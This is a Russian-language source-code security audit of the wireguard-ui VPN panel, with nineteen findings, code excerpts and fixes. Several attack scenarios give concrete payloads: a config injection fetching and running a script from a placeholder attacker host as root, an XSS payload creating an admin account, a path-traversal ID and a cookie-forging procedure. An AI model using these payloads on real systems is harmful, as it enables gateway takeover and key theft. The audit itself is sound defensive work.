# Аудит безопасности wireguard-ui

**Объект:** `github.com/ngoduykhanh/wireguard-ui`, коммит `2fdafd3`
**Тип:** статический аудит исходного кода (белый ящик), без запуска инстанса
**Дата:** 2026-09-02
**Объём:** ~8 200 строк — Go-бэкенд (Echo v4), HTML-шаблоны, фронтенд-JS, Dockerfile, `init.sh`, GitHub Actions, зависимости Go и npm

---

## Резюме

wireguard-ui — веб-панель управления WireGuard-сервером. Она хранит приватный ключ сервера и всех
клиентов, работает с правами root (или с `NET_ADMIN`) и в штатной поставке перезапускает
`wg-quick` при изменении `wg0.conf`. Это делает её крайне чувствительной целью: компрометация
панели равна компрометации VPN-шлюза.

Общее состояние безопасности — **слабое**. Проект аккуратен в некоторых местах (bcrypt cost 14,
константное сравнение, генерация ключей через `wgtypes`/`crypto/rand`, продуманная защита от CSRF
через проверку `Content-Type`), но фундаментальные механизмы выбраны неверно: для рендеринга HTML
используется `text/template` вместо `html/template` (нулевое экранирование на всех страницах),
секрет сессий по умолчанию генерируется через `math/rand` с сидом от времени, а поля клиента
попадают в `wg0.conf` без фильтрации переводов строк.

Главные риски:

1. **Инъекция директив в `wg0.conf` через имя клиента → выполнение произвольных команд с правами
   root** на VPN-шлюзе. Достаточно учётной записи обычного «менеджера» (не администратора).
2. **Хранимый XSS** сразу в двух местах (серверный рендеринг и клиентский JS) — эскалация
   «менеджер → администратор».
3. **Предсказуемый ключ подписи cookie сессий**, если `SESSION_SECRET` не задан вручную.
4. **Три гонки на глобальных map**, каждая из которых приводит к неперехватываемому
   `fatal error` и падению всего процесса — удалённый DoS.
5. Учётные данные по умолчанию `admin`/`admin`, без ограничения попыток входа, слушает `0.0.0.0`
   без TLS.

---

## Сводка находок

| № | Уязвимость | Файл | Серьёзность | CWE |
|---|---|---|---|---|
| 1 | Инъекция в `wg0.conf` через `Name`/`Email` клиента → RCE от root | `handler/routes.go`, `templates/wg.conf`, `util/util.go` | **Критическая** | CWE-94 / CWE-93 |
| 2 | `text/template` вместо `html/template` → хранимый XSS на всех страницах | `router/router.go:9` | **Высокая** | CWE-79 |
| 3 | Хранимый DOM XSS в списке клиентов | `custom/js/helper.js` | **Высокая** | CWE-79 |
| 4 | Ключ сессий из `math/rand`, сид — `time.Now().UnixNano()` | `util/util.go:766`, `main.go:51` | **Высокая** | CWE-338 / CWE-330 |
| 5 | Падение процесса из-за гонок на глобальных map | `util/cache.go`, `util/util.go:434`, `telegram/bot.go` | **Высокая** | CWE-362 / CWE-1188 |
| 6 | Учётные данные по умолчанию + отсутствие защиты от перебора | `util/config.go:34`, `handler/routes.go:58` | **Высокая** | CWE-1392 / CWE-307 |
| 7 | `wg0.conf` с приватными ключами создаётся всемирно читаемым | `util/util.go:577` | Средняя | CWE-732 |
| 8 | Отсутствует авторизация на `/api/apply-wg-config` и WoL-эндпоинтах | `main.go:255` | Средняя | CWE-862 |
| 9 | Cookie сессии без флага `Secure` | `router/router.go:57`, `handler/routes.go:120` | Средняя | CWE-614 |
| 10 | Хэш пароля (и legacy plaintext) отдаётся в API | `handler/routes.go:135,148` | Средняя | CWE-522 |
| 11 | Перечисление пользователей и паника при кривом JSON на `/login` | `handler/routes.go:58` | Средняя | CWE-204 / CWE-248 |
| 12 | Отсутствие проверки ID в `SendTelegramClient` → обход каталога | `handler/routes.go:578` | Средняя | CWE-22 |
| 13 | Разыменование nil в `WakeOnHost` | `handler/routes_wake_on_lan.go:124` | Средняя | CWE-476 |
| 14 | Отсутствуют заголовки безопасности, кликджекинг | `router/router.go` | Средняя | CWE-1021 / CWE-693 |
| 15 | Каталоги БД создаются с правами 0777 | `store/jsondb/jsondb.go:48` | Средняя | CWE-732 |
| 16 | Цепочка поставки: `@master`-экшен с `GITHUB_TOKEN`, Go 1.21.5 в релизах | `.github/workflows/*` | Средняя | CWE-829 |
| 17 | Устаревшие/EOL зависимости, нет сканирования в CI | `go.mod`, `yarn.lock`, `.golangci.yml` | Низкая | CWE-1104 |
| 18 | Контейнер работает от root, `network_mode: host` | `Dockerfile`, `docker-compose.yaml` | Низкая | CWE-250 |
| 19 | Прочее: раскрытие информации, GET-логаут, CRC32 для сессий | разные | Низкая | CWE-200 |

---

## Находки

### 1. Инъекция директив в `wg0.conf` через имя клиента → выполнение кода с правами root

**Серьёзность:** Критическая · **CWE:** CWE-94 (Code Injection) / CWE-93 (CRLF Injection)
**Файлы:** `handler/routes.go:394` (`NewClient`), `handler/routes.go:711` (`UpdateClient`),
`util/util.go:563-570`, `templates/wg.conf:19-20`, `init.sh:14-19`

Поля `Name` и `Email` клиента не валидируются вообще: `c.Bind(&client)` кладёт их в модель как есть,
а `UpdateClient` просто присваивает `client.Name = _client.Name`. При этом шаблон конфига
подставляет их в файл через `text/template`, то есть без какого-либо экранирования:

```gotemplate
# ID:           {{ .Client.ID }}
# Name:         {{ .Client.Name }}
# Email:        {{ .Client.Email }}
```

Авторы осознавали проблему многострочных значений — но защитили **только** поле заметок:

```go
// escape multiline notes
for _, cd := range clientDataList {
    if cd.Client.AdditionalNotes != "" {
        cd.Client.AdditionalNotes = strings.ReplaceAll(cd.Client.AdditionalNotes, "\n", "\n# ")
    }
    escapedClientDataList = append(escapedClientDataList, cd)
}
```

`Name`, `Email` и `Endpoint` такой обработки не проходят. Символ `\n` в имени клиента добавляет в
`wg0.conf` произвольную строку.

Первый включённый клиент в шаблоне располагается **до** первого заголовка `[Peer]`, то есть его
комментарии всё ещё принадлежат секции `[Interface]`. Директива `PostUp` в этой секции выполняется
`wg-quick` через bash от имени root. Штатный `init.sh` вызывает `wg-quick` при каждой записи файла:

```bash
inotifyd - "$conf":w | while read -r event file; do
    wg-quick down "$file"
    wg-quick up "$file"
done &
```

**Сценарий атаки** (атакующий — аутентифицированный не-администратор, «менеджер»; либо кто угодно
при `DISABLE_LOGIN=true`):

1. `POST /client/set-status` для всех чужих клиентов (эндпоинт требует только `ValidSession`) —
   чтобы собственный клиент оказался первым включённым.
2. `POST /new-client` с телом
   `{"name":"pwn\nPostUp = wget http://attacker/x -O- | sh","allocated_ips":["10.252.1.5/32"],"allowed_ips":["0.0.0.0/0"],"enabled":true}`.
3. `POST /api/apply-wg-config` — эндпоинт тоже требует только `ValidSession` (см. находку 8).
4. `WriteWireGuardServerConfig` перезаписывает `wg0.conf`, `inotifyd` замечает запись,
   `wg-quick up` выполняет `PostUp` от root.

**Влияние:** полный контроль над VPN-шлюзом (у контейнера `NET_ADMIN` и, как правило,
`network_mode: host`) от непривилегированного пользователя панели. Даже без попадания в
`[Interface]` инъекция ломает конфиг и кладёт туннель (отказ в обслуживании).

**Как исправить:**

```go
var clientFieldRe = regexp.MustCompile(`^[^\x00-\x1f\x7f]{0,64}$`) // без управляющих символов

if !clientFieldRe.MatchString(client.Name) || !clientFieldRe.MatchString(client.Email) {
    return c.JSON(http.StatusBadRequest, jsonHTTPResponse{false, "Invalid characters in name or email"})
}
```

Дополнительно: экранировать **каждое** подставляемое поле так же, как заметки (лучше — общей
функцией `escapeConfLine`), и проверять сгенерированный файл перед заменой рабочего конфига.
Валидацию делать на записи в БД, а не только при рендеринге, иначе уже сохранённые записи останутся
опасными.

---

### 2. `text/template` вместо `html/template` — хранимый XSS на всех страницах

**Серьёзность:** Высокая · **CWE:** CWE-79
**Файл:** `router/router.go:9`

```go
import (
    ...
    "text/template"   // ← а комментарий строкой ниже гласит "custom html/template renderer"
)
```

`text/template` не выполняет контекстно-зависимого экранирования. Все страницы рендерятся без
защиты. Подтверждённые точки внедрения:

```html
<!-- templates/status.html -->
<td>{{ $peer.Name }}</td>
<td>{{ $peer.Email }}</td>

<!-- templates/wake_on_lan_hosts.html -->
data-name="{{ .Name }}" data-mac-address="{{ .MacAddress }}">Edit
<span class="name">{{ .Name }}</span>

<!-- templates/server.html — инъекция уже в JS-строку -->
$("#addresses").addTag('{{.}}');
```

`Name` клиента и `Name` WoL-хоста не валидируются ничем. Значение `AllocatedIP` в `status.html`
намеренно содержит HTML (`allocatedIPs += "</br>"` в `handler/routes.go:975`) — то есть на
отсутствие экранирования здесь опираются осознанно, что и мешает простой замене пакета.

**Сценарий атаки:** менеджер создаёт клиента с именем
`<img src=x onerror="fetch('/create-user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'bd',password:'p',admin:true})})">`,
администратор открывает `/status` — в его сессии создаётся новый администратор. Cookie помечен
`HttpOnly`, поэтому кража cookie не работает, но выполнение запросов от имени администратора —
работает полностью (тот же origin, `Content-Type` выставляется свободно).

**Влияние:** эскалация «менеджер → администратор», далее — сценарий находки 1 или прямая правка
`PostUp` на странице сервера.

**Как исправить:** заменить импорт на `html/template` в `router/router.go` (в `util/util.go` для
`wg.conf` `text/template` корректен). Затем починить `status.html`: собирать `AllocatedIPs` как
срез строк и выводить через `{{range}}`, а не склеивать HTML в Go. Пройтись по всем шаблонам —
`html/template` укажет ошибки контекста на этапе парсинга.

---

### 3. Хранимый DOM XSS в списке клиентов

**Серьёзность:** Высокая · **CWE:** CWE-79
**Файл:** `custom/js/helper.js:1-105`

Карточки клиентов собираются конкатенацией строк и вставляются через `.append()`:

```js
let html = `... data-clientname="${obj.Client.name}">Edit</a>
            <span class="info-box-text"><i class="fas fa-user"></i> ${obj.Client.name}</span>
            <span class="info-box-text"><i class="fas fa-envelope"></i> ${obj.Client.email}</span>
            <span class="info-box-text"><i class="fas fa-file"></i> ${obj.Client.additional_notes}</span> ...`
$('#client-list').append(html);
```

`name`, `email` и `additional_notes` не проходят ни серверной валидации, ни клиентского
экранирования, и попадают одновременно в текстовый контекст и в значение атрибута (возможен выход
из кавычек: `" onmouseover=alert(1) x="`). Аналогично в `custom/js/wake_on_lan_hosts.js` шаблон
собирается через `.replace(/{{ .Name }}/g, response.Name)`.

Поля `allocated_ips`, `allowed_ips` и `public_key` здесь безопасны — они проходят
`ValidateCIDRList` и `wgtypes.ParseKey`.

**Сценарий атаки:** тот же, что в находке 2, но срабатывает на главной странице `/`, которую
администратор открывает при каждом входе.

**Как исправить:** строить DOM через `document.createElement` / `$('<span>').text(value)`, либо
пропускать все значения через функцию экранирования перед подстановкой в шаблонную строку.
Атрибуты задавать через `.attr()`, а не интерполяцией.

---

### 4. Ключ подписи cookie сессий генерируется небезопасным ГПСЧ

**Серьёзность:** Высокая · **CWE:** CWE-338 (Use of Cryptographically Weak PRNG) / CWE-330
**Файлы:** `util/util.go:766`, `main.go:51`, `main.go:143`, `router/router.go:57`

```go
func RandomString(length int) string {
    var seededRand = rand.New(rand.NewSource(time.Now().UnixNano())) // math/rand!
    charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    ...
}
```

```go
flagSessionSecret = util.RandomString(32)          // main.go:51 — значение по умолчанию
util.SessionSecret = sha512.Sum512([]byte(flagSessionSecret))  // main.go:143
cookieStore := sessions.NewCookieStore(secret[:32], secret[32:]) // router.go:57
```

Если `SESSION_SECRET` не задан (а в README он помечен как необязательный), ключи подписи и
шифрования cookie полностью определяются одним `int64` — наносекундной меткой запуска процесса.
Реальная энтропия — не 190 бит, а размер окна неопределённости старта в наносекундах.

**Сценарий атаки** (атакующий — менеджер, то есть уже имеет валидную cookie):

1. Получить точное окно перезапуска: опрашивать `/_health` (без аутентификации) — или вызвать
   перезапуск самому через находку 5.
2. Офлайн перебрать сиды в этом окне, для каждого восстановить ключ и проверить HMAC собственной
   валидной cookie. При окне в одну секунду это ~2³⁰ проверок — минуты на GPU.
3. Получить свою запись через `GET /api/user/<свой_логин>` (она отдаётся целиком, см. находку 10)
   и вычислить `crc32(gob(model.User))` — то же значение, что хранит сервер.
4. Собрать cookie со своим логином, корректным `user_hash` и `admin: true`. Проверка
   `isValidSession` сверяет только имя пользователя и CRC32 записи; флаг администратора берётся
   **из cookie**, а не из БД:

```go
func isAdmin(c echo.Context) bool {
    sess, _ := session.Get("session", c)
    admin := fmt.Sprintf("%t", sess.Values["admin"])
    return admin == "true"
}
```

**Влияние:** эскалация до администратора без знания пароля; при известной записи администратора —
полный обход аутентификации.

Отдельно: даже при заданном вручную `SESSION_SECRET` он растягивается одним неподсолённым
`sha512` — слабую парольную фразу можно перебрать офлайн.

**Как исправить:**

```go
import "crypto/rand"

func RandomString(length int) (string, error) {
    b := make([]byte, length)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return base64.RawURLEncoding.EncodeToString(b)[:length], nil
}
```

Плюс: не логировать и не использовать это значение как ключ напрямую — прогонять пользовательский
секрет через HKDF или scrypt/argon2 с солью, а не через голый SHA-512.

---

### 5. Гонки на глобальных map → неперехватываемое падение процесса

**Серьёзность:** Высокая · **CWE:** CWE-362 / CWE-1188
**Файлы:** `util/cache.go`, `util/util.go:424-445`, `store/jsondb/jsondb.go:210-224`,
`handler/session.go:68`, `telegram/bot.go:29-30`

```go
// util/cache.go — мьютекс есть только у одной из четырёх карт
var IPToSubnetRange = map[string]uint16{}
var TgUseridToClientID = map[int64][]string{}
var TgUseridToClientIDMutex sync.RWMutex
var DBUsersToCRC32 = map[string]uint32{}
```

Три независимые гонки:

1. **`IPToSubnetRange`** — пишется без блокировки в `findSubnetRangeForIP` (`util/util.go:434`),
   вызывается из `FillClientSubnetRange` в обработчике `GET /api/clients`. Два одновременных
   запроса → `concurrent map writes`.
2. **`DBUsersToCRC32`** — читается в `isValidSession` (`handler/session.go:68`) на **каждом**
   аутентифицированном запросе, пишется в `SaveUser`/`DeleteUser`. → `concurrent map read and map write`.
3. **`floodWait` / `floodMessageSent`** (`telegram/bot.go`) — используются из трёх горутин:
   цикла опроса Telegram, тикера `updateFloodWait` и HTTP-обработчиков через `SendConfig`.
   `BotMutex` защищает только переменную `Bot`, но не карты.

Это не паника, а `fatal error` рантайма Go — его **невозможно** перехватить через `recover()`,
процесс завершается целиком.

**Сценарий атаки:** любой аутентифицированный пользователь параллельно шлёт
`GET /api/clients` в несколько потоков (при заданном `SUBNET_RANGES`) — или в цикле дёргает
`POST /update-user` на самом себе, пока идут другие запросы. Сервис падает; при `restart: always`
это ещё и способ подобрать момент рестарта для находки 4.

**Как исправить:** закрыть все три карты `sync.RWMutex` (или заменить на `sync.Map`), включить
`-race` в CI на интеграционных тестах. Минимальный патч:

```go
var (
    IPToSubnetRange      = map[string]uint16{}
    IPToSubnetRangeMutex sync.RWMutex
    DBUsersToCRC32       = map[string]uint32{}
    DBUsersToCRC32Mutex  sync.RWMutex
)
```

---

### 6. Учётные данные по умолчанию и отсутствие защиты от перебора

**Серьёзность:** Высокая · **CWE:** CWE-1392 / CWE-307
**Файлы:** `util/config.go:34-35`, `store/jsondb/jsondb.go:131-146`, `handler/routes.go:58-131`

```go
DefaultUsername = "admin"
DefaultPassword = "admin"
DefaultIsAdmin  = true
```

При первом запуске без `WGUI_USERNAME`/`WGUI_PASSWORD` создаётся администратор `admin`/`admin`.
Смена пароля не форсируется, предупреждения в интерфейсе нет — только строчка в README.
Обработчик `Login` не имеет ни счётчика попыток, ни блокировки, ни задержки, ни CAPTCHA; в
`router.New` нет `middleware.RateLimiter`. `BIND_ADDRESS` по умолчанию — `0.0.0.0`, TLS в
приложении не поддерживается вообще.

Дополнительно: `bcrypt` с cost 14 — сам по себе хорошо, но без ограничения попыток превращается в
усилитель нагрузки: каждый запрос на `/login` стоит серверу ~1 секунды CPU. Несколько сотен
параллельных запросов кладут инстанс.

**Как исправить:** требовать смену пароля по умолчанию при первом входе (или отказываться
стартовать с `admin`/`admin` без явного `WGUI_ALLOW_DEFAULT_PASSWORD`); добавить
`middleware.RateLimiterWithConfig` на `/login` и экспоненциальную задержку/блокировку по
username+IP; в документации явно требовать TLS-терминацию перед сервисом.

---

### 7. `wg0.conf` с приватными ключами создаётся всемирно читаемым

**Серьёзность:** Средняя · **CWE:** CWE-732
**Файл:** `util/util.go:576-596`

Все файлы БД аккуратно переводятся в `0600` через `util.ManagePerms`, но именно для конфига
WireGuard этот вызов забыт:

```go
f, err := os.Create(globalSettings.ConfigFilePath)  // режим 0666 & ^umask → обычно 0644
...
err = t.Execute(f, config)
...
f.Close()   // ManagePerms не вызывается
```

Файл содержит `PrivateKey` сервера и все `PresharedKey` клиентов. Каталог `/etc/wireguard` обычно
пробрасывается с хоста (`- /etc/wireguard:/etc/wireguard` в `docker-compose.yaml`), так что ключи
становятся доступны любому локальному пользователю хоста и любому контейнеру с этим томом.

Побочный дефект того же места: `os.Create` **усекает** файл до рендеринга. Ошибка шаблона
(например, кастомного из `WG_CONF_TEMPLATE`) оставляет пустой или обрезанный конфиг — туннель
падает.

**Как исправить:**

```go
f, err := os.OpenFile(globalSettings.ConfigFilePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
```

Лучше — рендерить во временный файл рядом, проверять результат и делать `os.Rename` (атомарная
замена), затем `ManagePerms`.

---

### 8. Отсутствует проверка прав администратора на изменяющих эндпоинтах

**Серьёзность:** Средняя · **CWE:** CWE-862 (Missing Authorization)
**Файл:** `main.go:246-259`

```go
app.POST(util.BasePath+"/api/apply-wg-config", handler.ApplyServerConfig(db, tmplDir),
         handler.ValidSession, handler.ContentTypeJson)          // ← нет NeedsAdmin
app.PUT(util.BasePath+"/wake_on_lan_host/:mac_address", handler.WakeOnHost(db),
         handler.ValidSession, handler.ContentTypeJson)          // ← нет NeedsAdmin
app.DELETE(util.BasePath+"/wake_on_lan_host/:mac_address", ...)  // ← нет NeedsAdmin
```

Для сравнения, соседние серверные операции защищены корректно:
`/wg-server/interfaces`, `/wg-server/keypair`, `/global-settings` имеют `handler.NeedsAdmin`.

Любой аутентифицированный не-администратор может перезаписать и перезагрузить конфигурацию
сервера — это и есть «спусковой крючок» для находки 1, — а также рассылать magic-пакеты и удалять
чужие WoL-хосты.

Отмечу честно: `/new-client`, `/update-client`, `/download`, `/api/clients` тоже доступны
менеджерам, но это осознанный дизайн (роль менеджера существует именно для управления клиентами).
Проблема — именно в операциях уровня сервера.

**Как исправить:** добавить `handler.NeedsAdmin` к `/api/apply-wg-config` и к трём WoL-маршрутам,
либо ввести явную модель разрешений вместо булева `admin`.

---

### 9. Cookie сессии без атрибута `Secure`

**Серьёзность:** Средняя · **CWE:** CWE-614
**Файлы:** `router/router.go:57-62`, `handler/routes.go:100-128`, `handler/session.go:106-127, 232-248`

Во всех четырёх местах, где выставляются параметры cookie, есть `HttpOnly` и `SameSite`, но нет
`Secure`:

```go
sess.Options = &sessions.Options{
    Path:     cookiePath,
    MaxAge:   ageMax,
    HttpOnly: true,
    SameSite: http.SameSiteLaxMode,
    // Secure отсутствует
}
```

Приложение не умеет TLS и в типовом развёртывании стоит за обратным прокси. Любой запрос,
случайно ушедший по HTTP (опечатка в адресе, редирект, старая закладка), отдаёт cookie сессии в
открытом виде.

**Как исправить:** добавить `Secure: true`, управляемый переменной окружения
(например `WGUI_COOKIE_SECURE`, по умолчанию `true`), чтобы не ломать локальную разработку по HTTP.
Заодно стоит выровнять `cookieStore.MaxAge(86400*7)` с `SESSION_MAX_DURATION` (по умолчанию
90 дней) — сейчас значения расходятся.

---

### 10. Хэш пароля и legacy-пароль в открытом виде отдаются через API

**Серьёзность:** Средняя · **CWE:** CWE-522 / CWE-200
**Файлы:** `handler/routes.go:135-166`, `model/user.go`

```go
type User struct {
    Username     string `json:"username"`
    Password     string `json:"password"`       // legacy plaintext
    PasswordHash string `json:"password_hash"`
    Admin        bool   `json:"admin"`
}
```

`GetUsers` (`/get-users`) и `GetUser` (`/api/user/:username`) сериализуют структуру целиком.
Фронтенд использует только `username` и `admin` (`templates/users_settings.html:174-182`) — то есть
хэш утекает без всякой надобности. Не-администратор получает собственный bcrypt-хэш (материал для
офлайн-подбора и, что важнее, для вычисления CRC32 в атаке из находки 4). В инсталляциях,
мигрировавших со старых версий, поле `Password` содержит **пароль в открытом виде**, и
администратор видит чужие пароли в `/get-users`.

**Как исправить:** ввести DTO для ответов API либо пометить поля `json:"-"`:

```go
Password     string `json:"-"`
PasswordHash string `json:"-"`
```

(хранение в файле переключить на отдельную структуру или на `MarshalJSON`).
Отдельно — удалить поддержку legacy plaintext или принудительно хэшировать такие записи при старте.

---

### 11. `/login`: перечисление пользователей и паника на некорректном JSON

**Серьёзность:** Средняя · **CWE:** CWE-204 / CWE-248
**Файл:** `handler/routes.go:58-131`

```go
username := data["username"].(string)   // паника, если ключа нет или это не строка
password := data["password"].(string)
rememberMe := data["rememberMe"].(bool)
...
dbuser, err := db.GetUserByName(username)
if err != nil {
    return c.JSON(http.StatusInternalServerError, jsonHTTPResponse{false, "Invalid credentials"})  // 500
}
...
return c.JSON(http.StatusUnauthorized, jsonHTTPResponse{false, "Invalid credentials"})              // 401
```

Два дефекта:

* **Оракул существования пользователя.** Несуществующий логин → `500`, существующий с неверным
  паролем → `401`. Плюс временной канал: для несуществующего пользователя bcrypt (cost 14, ~1 с)
  вообще не выполняется.
* **Неперехваченные type assertion.** Тело `{}` или `{"username":1}` вызывает панику. В
  `router.New` **не зарегистрирован** `middleware.Recover()` — паника уходит в `net/http`, тот
  обрывает соединение и пишет полный стек в лог. Неаутентифицированный злоумышленник может засорять
  логи и получать разрыв соединения на каждый запрос.

Такие же непроверенные assertion есть в `UpdateUser` (`:212-215`), `CreateUser` (`:283-285`) и
`SetClientStatus` (`:744-745`) — там они доступны уже после аутентификации.

**Как исправить:** декодировать в типизированную структуру (`c.Bind` со struct-тегами), возвращать
`401` во всех неуспешных ветках, всегда выполнять сравнение пароля (в том числе с фиктивным хэшем
для несуществующего пользователя), добавить `e.Use(middleware.Recover())` в `router.New`.

---

### 12. Отсутствие валидации ID клиента в `SendTelegramClient` → обход каталога

**Серьёзность:** Средняя · **CWE:** CWE-22
**Файл:** `handler/routes.go:578-590`

Все остальные обработчики, принимающие ID клиента, валидируют его:

```go
if _, err := xid.FromString(clientID); err != nil {
    return c.JSON(http.StatusBadRequest, jsonHTTPResponse{false, "Please provide a valid client ID"})
}
```

`SendTelegramClient` эту проверку пропускает и передаёт значение прямо в scribble:

```go
var payload clientIdUseridPayload
c.Bind(&payload)

clientData, err := db.GetClientByID(payload.ID, model.QRCodeSettings{Enabled: false})
```

`scribble.Read` строит путь как `filepath.Join(dir, collection, resource)` без санитизации, поэтому
`{"id":"../server/keypair"}` читает `db/server/keypair.json`. JSON-теги совпадают (`private_key`),
и приватный ключ **сервера** попадает в `model.Client`, из которого строится конфиг.

Прямой утечки сейчас нет: отправка обрывается на `strconv.ParseInt(clientData.Client.TgUserid, ...)`,
потому что в файлах сервера нет поля `telegram_userid`. Практический эффект на сегодня — оракул
существования файлов (`404 "Client not found"` против `500 "userid: ..."`). Но примитив реальный, и
любое изменение логики отправки превращает его в чтение произвольных файлов.

**Как исправить:** добавить ту же проверку `xid.FromString` в `SendTelegramClient`; параллельно
санитизировать `collection`/`resource` внутри слоя `jsondb` (запретить `/`, `\` и `..`), не
полагаясь на дисциплину вызывающих.

---

### 13. Разыменование nil в обработчике Wake-on-LAN

**Серьёзность:** Средняя · **CWE:** CWE-476
**Файл:** `handler/routes_wake_on_lan.go:122-128`

```go
host, err := db.GetWakeOnLanHost(macAddress)   // при ошибке возвращает (nil, err)

now := time.Now().UTC()
host.LatestUsed = &now                          // ← err не проверен, host == nil
err = db.SaveWakeOnLanHost(*host)
```

`GetWakeOnLanHost` возвращает `nil` и при невалидном MAC, и при отсутствии записи. `PUT
/wake_on_lan_host/00-11-22-33-44-55` на несуществующий хост вызывает панику. Так как
`middleware.Recover()` не подключён, соединение обрывается, а в лог уходит стек.

**Как исправить:**

```go
host, err := db.GetWakeOnLanHost(macAddress)
if err != nil || host == nil {
    return createError(c, err, fmt.Sprintf("Wake On Host not found: %s", macAddress))
}
```

---

### 14. Отсутствуют заголовки безопасности; кликджекинг

**Серьёзность:** Средняя · **CWE:** CWE-1021 / CWE-693
**Файл:** `router/router.go:130-146`

Цепочка middleware состоит только из `session.Middleware`, `RemoveTrailingSlash` и логгера.
Не выставляются `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`,
`Referrer-Policy`, `Strict-Transport-Security`. Панель можно поместить в скрытый iframe и
спровоцировать администратора на клики (удаление клиентов, применение конфига). CSP также сняла бы
значительную часть риска находок 2 и 3.

**Как исправить:**

```go
e.Use(middleware.SecureWithConfig(middleware.SecureConfig{
    XFrameOptions:         "DENY",
    ContentTypeNosniff:    "nosniff",
    HSTSMaxAge:            31536000,
    ContentSecurityPolicy: "default-src 'self'; frame-ancestors 'none'; object-src 'none'",
}))
```

CSP потребует вынести встроенные `<script>` из шаблонов в отдельные файлы (или добавить nonce).

---

### 15. Каталоги базы данных создаются с правами 0777

**Серьёзность:** Средняя · **CWE:** CWE-732
**Файл:** `store/jsondb/jsondb.go:47-59`

```go
os.MkdirAll(clientPath, os.ModePerm)   // os.ModePerm == 0777
os.MkdirAll(serverPath, os.ModePerm)
os.MkdirAll(userPath, os.ModePerm)
os.MkdirAll(wakeOnLanHostsPath, os.ModePerm)
```

Сами файлы получают `0600`, но каталоги — `0777 &^ umask`. При типовом `umask 022` это `0755`
(перечисление содержимого доступно всем), при `umask 0` — `0777`, и тогда любой локальный
пользователь может подменить `db/users/admin.json` и войти под администратором.

**Как исправить:** `os.MkdirAll(path, 0700)`.

---

### 16. Цепочка поставки CI/CD

**Серьёзность:** Средняя · **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**Файлы:** `.github/workflows/release.yml`, `.github/workflows/docker-build.yml`

* **Экшен, привязанный к подвижной ветке, с доступом к токену:**

  ```yaml
  - uses: wangyoucao577/go-release-action@master
    with:
      github_token: ${{ secrets.GITHUB_TOKEN }}
  ```

  Компрометация чужого репозитория немедленно даёт подмену релизных бинарников wireguard-ui.
* **Нет блока `permissions:`** в `docker-build.yml` — job получает права `GITHUB_TOKEN` по
  умолчанию (в старых репозиториях — на запись), хотя ему нужен только `contents: read`.
* **Экшены закреплены тегами, а не SHA** (`actions/checkout@v4`, `docker/build-push-action@v5`,
  `managedkaos/print-env@v1.0`); теги перемещаемы.
* **`managedkaos/print-env`** печатает окружение в журнал сборки. Сейчас утечки нет (шаг выполняется
  до `docker/login-action`), но одна перестановка шагов — и `DOCKERHUB_TOKEN` окажется в логах.
* **Интерполяция выражения в shell:**
  `if [[ '${{ github.ref }}' == *"refs/tags/"* ]]` — имя тега с апострофом выходит из строкового
  литерала. Требует права push, поэтому серьёзность низкая, но исправляется тривиально.
* **Релизные бинарники собираются Go 1.21.5** (декабрь 2023): `goversion:
  "https://dl.google.com/go/go1.21.5.linux-amd64.tar.gz"`. С тех пор в стандартной библиотеке
  закрыто множество CVE. Ссылка на тарбол без проверки контрольной суммы.

**Как исправить:** закрепить все экшены по SHA; заменить `@master` на конкретный тег/SHA; добавить
`permissions: contents: read` (и `packages: write` там, где нужно); передавать `github.ref` через
`env:` вместо прямой интерполяции; поднять версию Go до актуального патча и обновлять её
автоматически.

---

### 17. Устаревшие зависимости и отсутствие сканирования

**Серьёзность:** Низкая · **CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
**Файлы:** `go.mod`, `yarn.lock`, `.golangci.yml`

Замечу отдельно: сопоставление ниже сделано **по закреплённым версиям**, без запуска сканеров
(`govulncheck`/`yarn audit` в этой среде недоступны), поэтому его следует перепроверить
инструментально.

* `golang.org/x/crypto v0.17.0` и `golang.org/x/net v0.19.0` — обе значительно отстают; в проекте
  используются только `bcrypt` и транзитивные пути, так что известные уязвимости `x/crypto/ssh` и
  `x/net/http2` скорее всего недостижимы, но обновление обязательно как гигиена.
* `github.com/golang-jwt/jwt v3.2.2+incompatible` — ветка v3 снята с поддержки (актуальна v5).
  Приходит транзитивно и в коде не используется.
* `gopkg.in/go-playground/validator.v9` — EOL, актуальна v10. Валидатор при этом фактически
  не применяется: `e.Validator` зарегистрирован, но `c.Validate()` не вызывается ни разу —
  отсюда во многом и растут находки 1 и 3.
* `github.com/sdomino/scribble` и `golang.zx2c4.com/wireguard/wgctrl` — псевдоверсии
  (коммиты 2021 и 2023 годов), без релизов.
* `github.com/glendc/go-external-ip` — на старте и на `/api/machine-ips` ходит на сторонние
  «эхо-сервисы» IP. В коде уже стоит `// TODO: Remove the go-external-ip dependency`.
* Фронтенд (в образ попадают): jQuery 3.5.0, Bootstrap 4.4.1, jquery-validation 1.19.3,
  select2, toastr, jquery-tags-input 1.3.5, AdminLTE 3.0.4. jQuery 3.5.0 закрывает
  CVE-2020-11022/11023, но Bootstrap 4.4.1 и jquery-validation 1.19.3 давно имеют более свежие
  исправленные ветки. `admin-lte: "^3.0"` в `package.json` — плавающий диапазон; спасает только
  `yarn install --pure-lockfile`.
* **В CI нет ни одного инструмента безопасности.** `.golangci.yml` включает только
  `gofmt, revive, goimports, govet, unused, whitespace, misspell` — ни `gosec`, ни `govulncheck`,
  ни Dependabot, ни запуска тестов с `-race` (тестов в репозитории нет вовсе).

**Как исправить:** добавить в CI `govulncheck`, `gosec`, `yarn audit` (или Dependabot/Renovate),
поднять прямые зависимости, убрать неиспользуемые транзитивные, включить `-race`.

---

### 18. Контейнер работает от root

**Серьёзность:** Низкая · **CWE:** CWE-250 (Execution with Unnecessary Privileges)
**Файлы:** `Dockerfile:57-77`, `docker-compose.yaml`

```dockerfile
RUN addgroup -S wgui && adduser -S -D -G wgui wgui   # пользователь создан...
...
ENTRYPOINT ["./init.sh"]                              # ...но директивы USER нет
```

Непривилегированный пользователь заводится и не используется — весь процесс идёт от root. В
`docker-compose.yaml` дополнительно `cap_add: NET_ADMIN` и `network_mode: host`, то есть изоляции
от сети хоста нет. Для `wg-quick` root действительно нужен, но UI-процесс мог бы работать отдельно
и с меньшими правами.

Там же — захардкоженные учётные данные в примере:
`WGUI_USERNAME=alpha`, `WGUI_PASSWORD=this-unusual-password`.

